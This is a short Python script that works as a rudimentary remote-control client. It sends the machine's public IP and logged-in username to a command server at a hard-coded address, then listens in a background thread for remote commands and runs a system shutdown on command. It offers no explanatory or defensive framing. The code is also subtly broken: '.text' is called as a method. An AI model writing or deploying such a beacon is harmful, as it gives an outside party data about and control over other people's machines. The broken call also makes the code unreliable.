import requests
from datetime import datetime
from threading import Thread
import os

CONN_URL = "http://192.168.1.149:8888/connect"

id = int(datetime.now().timestamp())
ip = requests.get("https://api.ipify.org").text()
username = os.getlogin()

data = {"ip": ip, "id": id, "username": username}

def cmd_rec(command):
    if command == "shutdown":
        os.system("shutdown")
    print(command)

def listen():
    response = requests.post(CONN_URL, json=data, stream=True)
    for line in response.iter_lines():
        if line:
            line = line.decode("utf-8")
            if line.startswith("null") == False:
                cmd_rec(line)

t = Thread(target=listen)
t.start()